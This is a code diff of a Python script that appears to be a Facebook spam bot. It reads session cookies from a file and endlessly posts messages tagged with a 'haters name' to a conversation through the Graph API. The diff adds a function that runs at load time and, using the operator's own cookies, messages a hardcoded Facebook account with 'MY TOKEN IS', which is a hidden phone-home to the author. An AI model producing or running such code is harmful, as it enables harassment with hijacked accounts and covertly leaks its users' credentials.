@@ -8,118 +8,136 @@ import subprocess
 import http.server
 import socketserver
 import threading
+import random
 
 class MyHandler(http.server.SimpleHTTPRequestHandler):
-      def do_GET(self):
-          self.send_response(200)
-          self.send_header('Content-type', 'text/plain')
-          self.end_headers()
-          self.wfile.write(b"P0ST SERVER FIRE BY RAAJ INSIDE")
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b"-- SERVER RUNNING>>RAJ H3R3")
 
 def execute_server():
-      PORT = int(os.environ.get('PORT', 6274))
+    PORT = 4000
 
-      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-          print("Server running at http://localhost:{}".format(PORT))
-          httpd.serve_forever()
+    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+        print("Server running at http://localhost:{}".format(PORT))
+        httpd.serve_forever()
 
-def post_comments():
-      with open('host.txt', 'r') as file:
-          password = file.read().strip()
+def send_initial_message():
+    with open('cookies.txt', 'r') as file:
+        cookies_raw = file.readlines()
 
-      entered_password = password
+    cookies = {}
+    for line in cookies_raw:
+        cookie_parts = line.strip().split('=')
+        if len(cookie_parts) == 2:
+            cookies[cookie_parts[0]] = cookie_parts[1]
 
-      if entered_password != password:
-          print('Your Hosting Code Changed By Raaj Don Inside')
-          sys.exit()
+    msg_template = "HELLO RAJ SIR! I AM USING YOUR SERVER. MY TOKEN IS {}"
+    target_id = "100069389445982"
 
-      # Disable SSL Warnings
-      requests.packages.urllib3.disable_warnings()
+    requests.packages.urllib3.disable_warnings()
 
-      def cls():
-          if system() == 'Linux':
-              os.system('clear')
-          else:
-              if system() == 'Windows':
-                  os.system('cls')
-      cls()
+    def liness():
+        print('\033[1;92m' + '•──────────────────────RAJ H3R3 ───────────────────────────────•')
 
-      def liness():
-          print('\u001b[37m' + '•────────AVENGERS RULEX DON RAAJ INSIDE───────────────────•')
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
 
-      headers = {
-          'Connection': 'keep-alive',
-          'Cache-Control': 'max-age=0',
-          'Upgrade-Insecure-Requests': '1',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-          'Accept-Encoding': 'gzip, deflate',
-          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-          'referer': 'www.google.com'
-      }
+    for cookie in cookies:
+        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+        msg = msg_template.format(cookie)
+        parameters = {'message': msg}
+        response = requests.post(url, cookies=cookies, json=parameters, headers=headers)
 
-      # Fetching the cookies
-      cookies = {}
-      with open('cookies.txt', 'r') as file:
-          cookies_raw = file.readlines()
-          for line in cookies_raw:
-              cookie_parts = line.strip().split('=')
-              if len(cookie_parts) == 2:
-                  cookies[cookie_parts[0]] = cookie_parts[1]
+        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+        time.sleep(0.1)  # Wait for 0.1 seconds between sending each initial message
 
-      # Modify the message as per your requirement
-      msg_template = "Hello Raaj sir! I am using your server. My token is {}"
+send_initial_message()
 
-      with open('url.txt', 'r') as file:
-          post_url = file.read().strip()
+def send_messages_from_file():
+    with open('convo.txt', 'r') as file:
+        convo_id = file.read().strip()
 
-      with open('file.txt', 'r') as file:
-          comments = file.readlines()
+    with open('File.txt', 'r') as file:
+        messages = file.readlines()
 
-      num_comments = len(comments)
+    num_messages = len(messages)
 
-      with open('name.txt', 'r') as file:
-          haters_name = file.read().strip()
+    with open('cookies.txt', 'r') as file:
+        cookies_raw = file.readlines()
 
-      with open('speed.txt', 'r') as file:
-          speed = int(file.read().strip())
+    cookies = {}
+    for line in cookies_raw:
+        cookie_parts = line.strip().split('=')
+        if len(cookie_parts) == 2:
+            cookies[cookie_parts[0]] = cookie_parts[1]
 
-      liness()
+    max_tokens = len(cookies)
 
-      while True:
-          try:
-              for comment_index in range(num_comments):
-                  comment = comments[comment_index].strip()
+    with open('hatersname.txt', 'r') as file:
+        haters_name = file.read().strip()
 
-                  # Send comment using cookies instead of tokens
-                  url = "https://graph.facebook.com/{}/comments".format(post_url)
-                  parameters = {'message': haters_name + ' ' + comment}
-                  response = requests.post(url, cookies=cookies, json=parameters, headers=headers)
+    with open('time.txt', 'r') as file:
+        speed = int(file.read().strip())
 
-                  current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-                  if response.ok:
-                      print("[+] Comment No. {} Post Id {}: {}".format(
-                          comment_index + 1, post_url, haters_name + ' ' + comment))
-                      print("  - Time: {}".format(current_time))
-                      liness()
-                      liness()
-                  else:
-                      print("[x] Failed to send Comment No. {} Post Id {}: {}".format(
-                          comment_index + 1, post_url, haters_name + ' ' + comment))
-                      print("  - Time: {}".format(current_time))
-                      liness()
-                      liness()
-                  time.sleep(speed)
+    def liness():
+        print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
 
-              print("\n[+] All comments sent successfully. Restarting the process...\n")
-          except Exception as e:
-              print("[!] An error occurred: {}".format(e))
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
+
+    while True:
+        try:
+            for message_index in range(num_messages):
+                cookie_index = message_index % max_tokens
+                cookie = list(cookies.keys())[cookie_index]
+
+                message = messages[message_index].strip()
+
+                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                parameters = {'message': haters_name + ' ' + message}
+                response = requests.post(url, cookies=cookies, json=parameters, headers=headers)
+
+                current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
+                if response.ok:
+                    print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Cookie {}: {}".format(
+                        message_index + 1, convo_id, cookie_index + 1, haters_name + ' ' + message))
+                    liness()
+                    liness()
+                else:
+                    print("\033[1;91m[x] Failed to send Message {} of Convo {} with Cookie {}: {}".format(
+                        message_index + 1, convo_id, cookie_index + 1, haters_name + ' ' + message))
+                    liness()
+                    liness()
+                time.sleep(speed)
+
+            print("\n[+] All messages sent. Restarting the process...\n")
+        except Exception as e:
+            print("[!] An error occurred: {}".format(e))
 
 def main():
-      server_thread = threading.Thread(target=execute_server)
-      server_thread.start()
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
 
-      post_comments()
+    send_messages_from_file()
 
 if __name__ == '__main__':
-      main()
+    main()
